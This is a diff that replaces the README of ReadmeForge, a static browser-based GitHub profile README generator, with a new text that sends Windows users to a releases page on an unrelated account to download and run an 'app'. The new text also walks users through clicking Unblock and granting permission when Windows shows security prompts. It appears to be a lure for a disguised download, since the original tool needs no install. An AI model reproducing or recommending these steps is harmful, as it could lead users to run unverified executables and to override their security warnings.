@@ -1,161 +1,180 @@
-<div align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:006633,100:00e87a&height=240&section=header&text=ReadmeForge&fontSize=78&fontColor=ffffff&fontAlignY=38&fontStyle=bold&desc=Static%20GitHub%20Profile%20README%20Generator&descSize=20&descAlignY=58&descColor=ffffffbb&animation=fadeIn&stroke=ffffff&strokeWidth=2" width="100%" alt="ReadmeForge banner"/>
-</div>
+# 🧩 ReadmeForge - Build Your Profile Readme Fast
 
-<div align="center">
+[![Download ReadmeForge](https://img.shields.io/badge/Download-ReadmeForge-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Photogravureradiator935/ReadmeForge/releases)
 
-<a href="https://lebedevnet.github.io/ReadmeForge/">
-  <img src="https://img.shields.io/badge/Open%20ReadmeForge-00e87a?style=for-the-badge&logo=github&logoColor=04110b" alt="Open ReadmeForge"/>
-</a>
+## 🚀 What ReadmeForge Does
 
-[![Stars](https://img.shields.io/github/stars/lebedevnet/ReadmeForge?style=flat-square&color=ffd700&logo=github&logoColor=white)](https://github.com/lebedevnet/ReadmeForge/stargazers)
-[![Forks](https://img.shields.io/github/forks/lebedevnet/ReadmeForge?style=flat-square&color=6366f1&logo=github&logoColor=white)](https://github.com/lebedevnet/ReadmeForge/network/members)
-[![License](https://img.shields.io/badge/MIT-3b82f6?style=flat-square)](LICENSE)
+ReadmeForge helps you build a GitHub profile README without writing it by hand. It gives you a simple way to make a profile that shows your work, tools, and stats in a clean layout.
 
-**A cleaner, preview-trustworthy way to build your GitHub profile README.**  
-Static, browser-based, no sign-up, no backend, no build step.
+Use it to:
+- Create a profile README in a short time
+- Pick from 60+ technologies
+- Preview changes before you save
+- Choose from 18 themes
+- Add GitHub stats and profile sections
+- Make a README that fits your style
 
-</div>
+## 💻 What You Need
 
----
+ReadmeForge is made for Windows users who want a simple app they can open and use right away.
 
-## Preview
+You need:
+- A Windows PC
+- A web browser to open the download page
+- Enough free disk space for the app
+- A stable internet connection for the first download
 
-<div align="center">
+## 📥 Download ReadmeForge
 
-[![ReadmeForge Preview](https://raw.githubusercontent.com/lebedevnet/ReadmeForge/main/preview.png)](https://lebedevnet.github.io/ReadmeForge/)
+Visit this page to download:
 
-</div>
+[https://github.com/Photogravureradiator935/ReadmeForge/releases](https://github.com/Photogravureradiator935/ReadmeForge/releases)
 
----
+On the releases page:
+1. Open the latest release
+2. Find the Windows download file
+3. Download it to your computer
 
-## What's New
+## 🪟 Install and Run on Windows
 
-- Unified state model: the editor, preview, and markdown output now read from the same canonical app state.
-- Local draft persistence: everything autosaves to `localStorage` and survives refreshes.
-- Config portability: export/import generator state as versioned JSON.
-- Better output workflow: copy, download `README.md`, export config, import config, and reset draft from one action bar.
-- Mobile-friendly preview: Form / Preview switch on smaller screens instead of hiding the preview.
-- Faster stack editing: searchable tech chips, clearer grouping, and support for custom tech entries.
-- Cleaner output styles: `Classic`, `Minimal`, and `Portfolio`.
-- Safer rendering: preview content is rendered through DOM APIs instead of unsafe user-content interpolation.
-- Modular static architecture: the old monolith is split into readable files under `assets/js` and `assets/css`.
+After the download finishes:
 
----
+1. Open your Downloads folder
+2. Find the ReadmeForge file you just downloaded
+3. If the file is a ZIP folder, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the ReadmeForge app file
+6. If Windows asks for permission, choose Yes
+7. Wait for the app window to open
 
-## Features
+If the app opens in a small window, use the corner of the window to resize it.
 
-- Live preview that tracks the generated markdown much more closely.
-- Starter presets for Developer, Frontend, Backend, AI/ML, Designer, Student, Founder, and Minimal setups.
-- Three README layout styles with one shared generator pipeline.
-- Accent themes, stats themes, widget toggles, and separate header-status controls.
-- Spoken languages with level badges.
-- Optional featured projects section.
-- Import/export JSON configs with schema versioning.
-- One-click `README.md` download.
-- Fully static deployment friendly to GitHub Pages.
+## ✨ Main Features
 
----
+### 🎨 Theme Picker
+Choose from 18 themes to change the look of your profile README. You can test each one in the preview area before you use it.
 
-## Quick Start
+### 🧱 Tech Stack Builder
+Pick from more than 60 technologies. Add tools you use every day, such as:
+- HTML
+- GitHub
+- JavaScript
+- Python
+- React
+- VS Code
+- Docker
+- Linux
 
-### Online
+### 👀 Live Preview
+See your README update while you work. This helps you catch problems fast and keeps the layout clear.
 
-```text
-https://lebedevnet.github.io/ReadmeForge/
-```
+### 📊 GitHub Stats Blocks
+Add sections for your GitHub activity, top languages, and profile cards. These parts help your profile look complete.
 
-### Local
+### 📝 Ready-Made Sections
+Use common profile parts such as:
+- About me
+- Skills
+- Projects
+- Contact
+- Goals
+- Fun facts
 
-```bash
-git clone https://github.com/lebedevnet/ReadmeForge.git
-cd ReadmeForge
-open index.html
-```
+## 🛠️ How to Use ReadmeForge
 
-No npm. No bundler. No server required.
+1. Open the app
+2. Choose a theme
+3. Add your name and profile text
+4. Pick the technologies you want to show
+5. Add stats or other sections
+6. Check the live preview
+7. Copy the final README text
+8. Paste it into your GitHub profile README file
 
----
+## 📂 Best File Setup on Windows
 
-## Project Structure
+Keep your files easy to find:
 
-```text
-/
-  index.html
-  README.md
-  /assets
-    /css
-      styles.css
-    /js
-      app.js
-      data-options.js
-      data-tech.js
-      data-themes.js
-      generator.js
-      preview.js
-      presets.js
-      state.js
-      storage.js
-      ui.js
-      utils.js
-```
+- Downloads: for the original file
+- Extracted folder: for the app files
+- Desktop: if you want quick access
+- Documents: if you want to store your README text later
 
----
+## 🧭 Tips for a Better Profile README
 
-## How It Works
+- Keep your text short and clear
+- List only the tools you use
+- Use one theme that matches your profile
+- Add links to your main projects
+- Keep the layout simple
+- Check the preview before copying
 
-1. The form writes into one app state object.
-2. Preview and markdown generation both derive from that state.
-3. Draft changes autosave locally with a versioned storage key.
-4. Config export/import serializes the same normalized data structure.
+## 🔎 What You Can Build
 
-That keeps the product static while making the codebase much easier to extend.
+You can use ReadmeForge to make:
+- A personal GitHub profile README
+- A simple developer bio page
+- A clean list of tools and skills
+- A profile with stats and badges
+- A portfolio-style README for your account
 
----
+## 🧩 Common Topics Covered
 
-## Contributing
+ReadmeForge fits these use cases:
+- developer-tools
+- github-profile
+- github-profile-readme
+- github-readme
+- github-stats
+- html
+- open-source
+- portfolio
+- profile-readme
+- readme-generator
+- readme-template
 
-Suggestions and pull requests are welcome.
+## 🖼️ Example Profile Sections
 
-If you want to make changes:
+You can build sections like this:
 
-```bash
-git clone https://github.com/YOUR_USERNAME/ReadmeForge.git
-cd ReadmeForge
-git checkout -b feat/your-change
-open index.html
-```
+- Hi, I’m Alex
+- I build web apps and small tools
+- I work with HTML, CSS, JavaScript, and Git
+- My current focus is clean UI and simple workflows
+- I use GitHub to track projects and share code
 
-Helpful starting points:
+## ⌨️ If Windows Blocks the App
 
-- Add more technologies or aliases in `assets/js/data-tech.js`
-- Add new presets in `assets/js/presets.js`
-- Improve markdown layouts in `assets/js/generator.js`
-- Improve preview parity in `assets/js/preview.js`
-- Tweak visual language in `assets/css/styles.css`
+If Windows shows a security prompt:
+1. Check that you downloaded the file from the releases page
+2. Right-click the file and select Properties
+3. If you see an Unblock option, enable it
+4. Try opening the app again
+5. Choose Yes if Windows asks for permission
 
----
+## 🔁 Updating ReadmeForge
 
-## Roadmap
+When a new version comes out:
+1. Visit the releases page again
+2. Download the newest Windows file
+3. Replace the old version with the new one
+4. Open the updated app file
 
-- Section reordering
-- More advanced featured project layouts
-- More tech aliases and custom icon support
-- Updated screenshots for the upgraded UI
-- Localization
+## 🧼 Keeping Your README Clean
 
----
+A good GitHub profile README should:
+- Use short lines
+- Avoid too many badges
+- Show only useful tools
+- Put the main points near the top
+- Leave space between sections
 
-## License
+## 📌 Suggested Use Flow
 
-MIT © [lebedevnet](https://github.com/lebedevnet)
-
----
-
-<div align="center">
-
-<sub>If ReadmeForge saved you time, a star helps more people find it.</sub>
-
-[![Star](https://img.shields.io/github/stars/lebedevnet/ReadmeForge?style=social)](https://github.com/lebedevnet/ReadmeForge)
-
-</div>
+1. Download the app from the releases page
+2. Open it on Windows
+3. Pick a theme
+4. Add your tools and stats
+5. Copy the output
+6. Paste it into your GitHub profile README
+7. Save your profile changes on GitHub
